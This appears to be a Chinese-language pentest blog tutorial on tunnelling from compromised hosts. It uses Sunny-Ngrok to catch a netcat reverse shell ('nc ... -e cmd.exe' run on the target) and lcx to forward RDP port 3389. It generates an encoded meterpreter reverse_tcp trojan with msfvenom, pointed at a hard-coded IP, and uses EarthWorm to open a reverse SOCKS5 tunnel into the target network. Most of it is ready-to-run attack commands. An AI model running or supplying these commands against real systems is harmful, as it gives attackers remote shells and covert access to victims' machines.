***********![](../Images/1ae7a491a1cd329cb30bbc7d57f1005b.png)*************Ngrok**

  

Ngrok一个反向代理，通过在公共的端点和本地端口建立一个安全的通道，其功能可以反向代理出web服务还有**端口转发**，这里我们主要演示端口转发的功能

由于ngrok这个工具官网是要翻墙的，所以是能使用国内的Sunny-*Ngrok*

反弹nc shell

首先我们启动ngrok

`./sunny clientid 隧道id`

![](../Images/302651750321211eb67a676cfa31bc16.png)

本地监听端口：

`nc -vv -lp 9991`

![](../Images/89529f71e5141e5f1b978ee09d705c9d.png)

目标机器：

`nc -vv server.ngrok.cc 33388 -e cmd.exe`

![](../Images/7e5c568f769d1c493a69138fdfe57e3d.png)

这个我们使用nc本地监听ngrok转发的本地端口9001,然后目标机器请求ngrok分配的公网地址把自己的shell交给ngrok公网开放的端口，ngrok把端口再转发到我们本地建立一个隧道获取到shell。效果如下  

![](../Images/5fc550ecf60f1a15bc5595b46d856221.png)

至此已经拿到了目标机器cmd权限

ngrok结合lcx使用转发3389端口

目标机器：

`lcx -slave server.ngrok.cc 33388 127.0.0.1 3389`

![](../Images/46671725c80631594fdf7bbdacd93a0f.png)

本地指定监听：

`lcx -listen 9991 33389`

![](../Images/839722d4c9d4bfb4246460603e5e080d.png)

然后连接我们本地的33389端口：  

![](../Images/95e51f6799a9dc1945bf37ea138d0fa4.png)

结合msf反弹meterpreter shell

首先本地开启ngrok

设置用来反弹连接的木马

这里我们都知道配置的时候要获取到ip地址这里我们要用到NetCat这个工具

`nc -vv server.ngrok.cc 33388`

![](../Images/9332730b76f734936349e1bd487da290.png)

`msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=47.90.92.56 LPORT=33388 -b “\x00”-e x86/shikata_ga_nai -f exe -o ~/桌面/win.exe` //生成反弹木马

配置好木马后，我们kali使用msf监听本地ngrok转发的9991端口，等待反弹马

`msf exploit(handler) > run`

![](../Images/7faa9247fcb743aeccb9c345614e0056.png)

![](../Images/7e144e78ae9f85a3f82a5320da4d7480.png)

目标机器运行木马  

![](../Images/28279ebdf16572f566d2122fb53cd422.png)

可以看到我们本地已经反弹回了meterpreter的shell  

![](../Images/f92491486ef9e2ccba4e28c27a27e65e.png)至此，感谢**Double8**前辈的博文。

  

  

***********![](../Images/1ae7a491a1cd329cb30bbc7d57f1005b.png)**EathWorm*************

EathWorm是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透，跨平台！！！

该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx\_slave、lcx\_listen、lcx\_tran）

这里介绍一下反弹socks5端口转发

公网Linux上：

`./ew_for_linux64 -s rcsocks -l 1080 -e 8888`

![](../Images/a32b370d5024402216a51ba9d6757531.png)

目标机器上：

`ew_for_Win.exe -s rssocks -d 公网ip -e 8888` 

![](../Images/c1f77fc5886ccab811c900e806eeaf6a.png)

显示建立隧道成功  

![](../Images/149f12f92adfbb8166d53177a958b12f.png)

本地使用Proxifier工具进行连接  

![](../Images/e9162797f5e14e1943f9c8cab12cd4ce.png)

![](../Images/e1b91de80c1e0b347ece2cdaec8f3f2a.png)

![](../Images/b3ceae58a8225b32de8b69b3f73e5ec3.png)

输入目标机器ip连接3389即可  

![](../Images/5971be9051b286bfd13eab485341a932.png)

至此，我们可以清晰的看到已经可以socks代理连接目标端口了。
